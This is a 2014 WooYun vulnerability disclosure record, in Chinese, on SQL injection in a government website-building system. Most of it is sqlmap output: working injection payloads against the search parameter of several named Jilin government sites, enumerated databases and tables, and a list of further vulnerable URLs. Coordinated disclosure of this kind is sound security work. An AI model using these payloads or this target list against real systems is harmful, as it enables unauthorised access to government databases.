{"id": 51569, "wybug_id": "wooyun-2014-074066", "wybug_title": "某政府通用建站系统存在SQL注入", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "浮萍", "wybug_date": "2014-08-27 18:26", "wybug_open_date": "2014-11-25 18:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-25：\t细节向公众公开  简要描述：  详细说明：  长春首佳科技有限公司的建站程序http://www.sooka.com.cn/在搜索处存在注入双阳区人民政府http://www.shuangyang.gov.cn/\n\n\n\n拼urlhttp://www.shuangyang.gov.cn/search.jsp?key=a'&type=1&x=7&y=4\n\n\nGET parameter 'key' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 43 HTTP(s) requests:---Place: GETParameter: key    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: key=a%' AND 1069=1069 AND '%'='&type=1&x=7&y=4    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: key=a%' UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(121)+CHAR(110)+CHAR(108)+CHAR(113)+CHAR(99)+CHAR(72)+CHAR(72)+CHAR(108)+CHAR(78)+CHAR(72)+CHAR(70)+CHAR(105)+CHAR(75)+CHAR(120)+CHAR(113)+CHAR(102)+CHAR(115)+CHAR(99)+CHAR(113),NULL-- &type=1&x=7&y=4    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: key=a%'; WAITFOR DELAY '0:0:5'--&type=1&x=7&y=4    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: key=a%' WAITFOR DELAY '0:0:5'--&type=1&x=7&y=4---\n\nweb application technology: JSPback-end DBMS: Microsoft SQL Server 2000\n数据库\navailable databases [7]:[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] syqzf[*] tempdb\nsyqzf表\nDatabase: syqzf[22 tables]+----------------+| S3_Tmp         || admin_info     || affix_info     || dtproperties   || gbook_info     || gbook_type     || jyta_info      || news_info      || news_nr        || news_type      || pingyi_bm      || pingyi_pj      || poll_option    || poll_title     || qzzc_info      || sqlmapoutput   || sysconstraints || syssegments    || ysqgk_info     || zbft_info      || zbft_nr        || zxsb_info      |+----------------+\n百度搜索“网站维护:双阳区人民政府信息中心　技术支持:长春首佳科技有限公司”\n\n   漏洞证明：  乾安县人民政府 http://www.jlqa.gov.cn/main/search.jsp?key=a\nGET parameter 'key' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 63 HTTP(s) requests:---Place: GETParameter: key    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: key=a%' AND 3474=3474 AND '%'='    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: key=a%' AND 1941=DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(83)||CHR(72)||CHR(67),5) AND '%'='---\n\nweb application technology: JSPback-end DBMS: Oracle\n数据库\navailable databases [26]:[*] CTXSYS[*] HR[*] MDSYS[*] ODM[*] ODM_MTR[*] OE[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PM[*] QACL[*] QIANAN_WEB[*] QS[*] QS_CBADM[*] QS_CS[*] QS_ES[*] QS_OS[*] QS_WS[*] RMAN[*] SCOTT[*] SH[*] SYS[*] SYSTEM[*] WKSYS[*] WMSYS[*] XDB\n--------------吉林市人民政府http://jlcity.gov.cn/jlszf_web/gjzssss.jsp?key=a\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: key    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: key=a%' AND 8188=8188 AND '%'='    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: key=a%' AND 7528=DBMS_PIPE.RECEIVE_MESSAGE(CHR(120)||CHR(81)||CHR(79)||CHR(67),5) AND '%'='---\n\nweb application technology: JSPback-end DBMS: Oracle\n30个数据库\n\n-----四平市铁东区人民政府网站http://www.jlsptd.gov.cn/search.jsp?key=a&x=19&y=8\nsqlmap identified the following injection points with a total of 0 HTTP(s) requsts:---Place: GETParameter: key    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: key=a%' AND 7545=DBMS_PIPE.RECEIVE_MESSAGE(CHR(68)||CHR(79)||CHR(7)||CHR(70),5) AND '%'='&x=19&y=8---[15:08:51] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle\n-------白城市人民政府网站www.bc.jl.gov.cn/search.jsp?key=a\nsqlmap identified the following injection points with a total of 79 HTTP(s) requests:---Place: GETParameter: key    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: key=a'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: key=a' WAITFOR DELAY '0:0:5'-----\n\nweb application technology: JSPback-end DBMS: Microsoft SQL Server 2000\n等等还有如下一些网站\n双阳纪检监察:http://www.syjjw.gov.cn/info/search.jsp?key=aa&tid=3&x=27&y=10双阳经开网http://www.csjk.gov.cn/search.jsp?skey=a&x=20&y=6长春经济技术开发区http://www.cetdz.gov.cn/list_select.jsp?selectTitle=aa蛟河市人民政府网站http://www.jiaohe.gov.cn/main/search.jsp?key=a&image.x=11&image.y=12通化市人民政府http://www.tonghua.gov.cn/search.jsp?key=a柳河县人力资源和社会保障局http://www.lhxrsj.gov.cn/frame/public/search.jsp?search=a&x=13&y=1\n   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-09-01 10:05 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给吉林分中心，由吉林分中心后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}